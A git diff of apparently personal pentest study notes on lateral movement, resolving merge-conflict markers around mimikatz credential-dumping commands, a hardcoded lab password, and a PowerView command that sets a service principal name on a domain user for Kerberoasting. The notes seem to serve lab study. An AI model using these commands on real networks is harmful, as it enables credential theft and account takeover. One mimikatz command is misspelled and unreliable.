@@ -166,12 +166,9 @@ tag:lateral-movement
 
 ```
 
-<<<<<<< HEAD
-** Pillaging** 
 
-=======
 **Pillaging** 
->>>>>>> 3629eb7836b426008e6f682f73859bad98ae31f6
+
 ```
 mimikatz.exe 
 lasadump::secrets
@@ -182,7 +179,4 @@ token::elevate
 $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
 Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
-<<<<<<< HEAD
-```
-=======
->>>>>>> 3629eb7836b426008e6f682f73859bad98ae31f6
+
